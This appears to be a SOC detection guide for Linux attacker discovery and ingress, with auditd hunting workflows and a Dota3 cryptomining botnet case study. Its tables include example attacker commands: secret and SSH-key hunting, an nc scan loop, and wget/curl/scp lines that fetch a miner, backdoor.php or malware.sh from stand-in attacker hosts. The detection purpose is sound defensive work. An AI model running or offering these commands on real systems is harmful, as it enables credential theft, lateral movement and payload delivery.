# Linux Discovery & Ingress — detection guidance

Threat actors performing initial reconnaissance on Linux systems commonly run the same set of discovery commands regardless of entry point or ultimate goal. The only common exception is a very narrow “spray-and-mine” scenario — when the attacker just wants to drop a cryptominer and leave, regardless of the victim. Below are concise examples of common discovery, focused attacker objectives, and practical detection guidance you can reuse in a GitHub README or SOC playbook.

---

## Basic Discovery examples

| **Discovery goal**          | **Typical commands**                                                   |
| --------------------------- | ---------------------------------------------------------------------- |
| OS and filesystem discovery | `pwd`, `ls /`, `env`, `uname -a`, `lsb_release -a`, `hostname`         |
| User & groups discovery     | `id`, `whoami`, `w`, `last`, `cat /etc/sudoers`, `cat /etc/passwd`     |
| Process & network discovery | `ps aux`, `top`, `ip a`, `ip r`, `arp -a`, `ss -tnlp`, `netstat -tnlp` |
| Cloud / sandbox discovery   | `systemd-detect-virt`, `lsmod`, `uptime`, `pgrep "<edr-or-sandbox>"`   |

---

## Specialized discovery (by attacker objective)

After initial discovery, attackers often run more focused commands depending on their intent:

| **Attack objective**                         | **Typical commands**                                                 |                                                            |
| -------------------------------------------- | -------------------------------------------------------------------- | ---------------------------------------------------------- |
| Find & exfiltrate credentials / secrets      | `history                                                             | grep pass`, `find / -name .env`, `find /home -name id_rsa` |
| Assess suitability for crypto mining         | `cat /proc/cpuinfo`, `lscpu                                          | grep Model`, `free -m`, `top`, `htop`                      |
| Scan internal network for additional victims | `ping <ip>`, `for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22; done` |                                                            |

---

## Detecting discovery activity

Discovery is straightforward to detect with process creation auditing (auditd) or other runtime monitoring:

1. Configure auditd (or equivalent) to log command execution and process creation.
2. Use SIEM searches (or `ausearch`) to hunt for the examples above.
3. The hard part is attribution: differentiate attacker activity from legitimate admin or service behavior.


<img width="1385" height="351" alt="image" src="https://github.com/user-attachments/assets/e77089cc-4916-4ac2-9a6f-509194d0d180" />


**Context is critical.** Examples of suspicious context:

* A web server process spawning `whoami` or `cat /etc/passwd`.
* A user account running `find`/`grep` across home directories outside scheduled maintenance windows.
* A network monitoring tool periodically `ping`ing the local network is expected — an admin-scheduled job is not.

Build a process tree (via audit logs) to get context. Example workflow:

```bash
# Find executions of whoami
ausearch -i -x whoami

# Inspect parent process (ppid) returned from previous result
ausearch -i --pid <ppid>

# Inspect other children of that parent process
ausearch -i --ppid <ppid>
```

---

## “Hack-and-forget” attacks

These are high-scale opportunistic attacks: the attacker finds weak SSH, performs fast discovery, then usually ends in one (or more) of:

* **Install a cryptominer** — use victim CPU/GPU for profit.
* **Enroll the host into a botnet** (e.g., Mirai-style) — for DDoS and other tasks.
* **Use the host as a proxy** — for phishing, distribution, or routing attacker traffic.

---

## Ingress — common file-transfer mechanisms (T1105)

Threat actors commonly use preinstalled tools to transfer payloads to Linux systems:

| **Command**    | **Usage example**                                                          |
| -------------- | -------------------------------------------------------------------------- |
| `wget`         | `wget https://example.com/xmrig.tar.gz -O /tmp/miner.tar.gz`               |
| `curl`         | `curl --output /var/www/html/backdoor.php "https://pastebin.example/abcd"` |
| `scp` / `sftp` | `scp attacker@c2:/home/attacker/malware.sh /tmp/malware.sh`                |

Notes:

* If the attacker initiates an `scp`/`sftp` from their machine, you will not see the remote command on the victim; you will instead see a successful SSH login in the victim’s auth logs.
* If the victim runs `scp` to fetch from an attacker, that `scp` invocation can appear in the victim’s audit logs.

Example detection patterns:

* Monitor `/var/log/auth.log` (or platform equivalent) for unusual SSH logins from external IPs.
* Audit process creation for `wget`, `curl`, `scp`, and suspicious command-line arguments.
* Watch for newly created files in `/tmp`, `/var/tmp`, or other staging directories.

---

## Additional detection signals

**Network traffic**

* Downloads from IPs or domains previously associated with malicious activity.
* Downloads from public hosting providers (GitHub, Pastebin) used for distributing tools.

**File events**

* Newly created files in `/tmp`, `/var/tmp`, webroot directories, or oddly named files like `exploit`, `shell.php`, `kF1pBsY5`, or randomized names.

**EDR/AV**

* EDR or antivirus alerts on newly written files or known malicious binaries (e.g., XMRig signatures).

---

## Example investigation: using auditd to build a process tree

1. Search for a discovery command (example: `whoami`):

```bash
ausearch -i -x whoami
```

2. From the result, note `ppid` and inspect the parent:

```bash
ausearch -i --pid <ppid>
```

3. List other children of that parent (`--ppid`) to see what else ran:

```bash
ausearch -i --ppid <ppid>
```

This workflow helps determine whether the `whoami` invocation was spawned by a legitimate script, admin activity, or a malicious one-off.

---

## Short case study — “Dota3” (summary)

Based on public reporting (CounterCraft, SANS), a simplified Dota3 infection chain looks like:

1. **Initial access**: Large botnet scans for SSH and brute-forces weak credentials (root / weak passwords).
2. **Discovery**: From an interactive or scripted SSH session the attacker gathers system info (`/proc/cpuinfo`, `free -m`, `lscpu`) — strong indicator of crypto-mining intent.
3. **Persistence**: Attacker changes user password and replaces SSH keys to retain access (e.g., remove `.ssh`, recreate `.ssh/authorized_keys` with attacker key).
4. **Ingress & payload execution**: Attacker transfers an archive (`dota3.tar.gz`) → unpacks to a hidden directory in `/tmp` (e.g., `/tmp/.X26-unix/.rsync/...`) → launches background services with `nohup`:

   * `tsm` — network scanner to find other SSH-exposed hosts
   * `initall` — XMRig miner

**Detection knobs for this pattern**

* Auth logs: successful SSH logins from untrusted external IPs.
* Auditd: creation of hidden folders and unusual filenames in `/tmp`.
* Auditd/EDR: execution of `nohup` on unknown binaries and sudden long-lived CPU-heavy processes.
* Network: unusual SSH scanning to private ranges (192.168.*.*, 172.16.*.*).
* EDR/AV: detection of known miner binaries (VirusTotal/AV hits).

---

## Useful audit & hunt commands (examples)

```bash
# Find successful SSH logins (Debian/Ubuntu example)
cat /var/log/auth.log | grep "Accepted"

# Search auditd for specific commands
ausearch -i -x uname
ausearch -i -x lscpu
ausearch -i -x wget
```

If you keep full audit logs on disk, you can run queries like:

```bash
ausearch -i -if /path/to/audit.log | egrep "whoami|lscpu|uname|wget|curl|scp"
```

---

## Practical recommendations for a SOC

* Log process creation events (auditd, syscall tracing, EDR) and centralize them in a SIEM.
* Correlate process execution with auth logs and network indicators (e.g., outbound downloads, suspicious domains).
* Build simple detection rules:

  * Execution of discovery commands by non-admin accounts or from unexpected parent processes.
  * File creation in `/tmp` with hidden/random names followed by execution.
  * Sudden long-lived, high-CPU processes launched with `nohup`.
* Enforce strong SSH authentication:

  * Disable password-based root login.
  * Require key-based auth and enforce key rotation.
  * Rate-limit/suppress automated SSH attempts (fail2ban, firewall rules).

---

## Assets & references

* MITRE ATT&CK — Ingress Tool Transfer (T1105): [https://attack.mitre.org/techniques/T1105/](https://attack.mitre.org/techniques/T1105/)
* Mirai retrospective (example botnet): Cloudflare blog
* VirusTotal examples for miner binaries (use VT for file/IP reputation lookups)

---

